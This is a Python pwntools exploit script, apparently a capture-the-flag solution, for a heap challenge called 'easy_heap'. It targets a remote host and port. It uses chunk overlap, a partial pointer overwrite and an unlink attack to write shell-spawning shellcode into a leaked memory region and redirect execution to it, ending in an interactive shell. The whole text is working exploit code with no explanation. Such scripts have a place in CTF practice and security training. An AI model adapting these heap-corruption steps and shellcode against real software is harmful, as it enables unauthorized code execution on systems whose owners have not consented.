from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./easy_heap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./easy_heap")
else:
	p = remote("132.232.100.67","10004")
	libc = ELF("libc.so.6")
	elf = ELF("./easy_heap")

def menu(choice):
	p.sendlineafter(">> ",str(choice))

def add(size):
	menu(1)
	p.sendlineafter("Size: ",str(size))

def edit(index,content):
	menu(3)
	p.sendlineafter("Index: ",str(index))
	p.sendafter("Content: ",content)

def free(index):
	menu(2)
	p.sendlineafter("Index: ",str(index))

code_base = 0x555555554000
def debugf():
	if debug:
		gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xC48)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
context.bits = 64
sc = asm(shellcraft.sh())
#debugf()
p.recvuntil("Mmap: ")
leak_addr = int(p.recvuntil("\n",drop = True),16)
sc_addr = leak_addr
log.success("sc_addr:" + hex(sc_addr))
add(0xf0) #0
add(0x68) #1
add(0xf0) #2
add(0x68) #3
free(0)
payload = "a" * 0x60 + p64(0x100 + 0x70)
edit(1,payload)
free(2)
free(1)
add(0xf0) #0
free(0)
add(0x110) #0
payload = "\x00" * 0xf0 + p64(0) + p64(0x71) + "\xed\x1a"
edit(0,payload + "\n")
add(0x68) #1
add(0x68) #2
debugf()
add(0x140) #4
add(0x28) #5
p.recvuntil("chunk at [5] Pointer Address ")
leak_addr = int(p.recvuntil("\n",drop = True),16)
target = leak_addr
add(0xf8) #6
add(0x30) #7
payload = p64(0) + p64(0x21) + p64(target - 0x18) + p64(target - 0x10) + p64(0x20)
edit(5,payload + "\n")
free(6)
payload = p64(0) * 2 + p64(0x50) + p64(sc_addr)
edit(5,payload + "\n")
edit(5,sc + "\n")
payload = "aaa" + p64(0) * 2 + p64(sc_addr)
edit(2,payload + "\n")
menu(1)
p.sendlineafter("Size: ",str(0x10))
p.interactive()
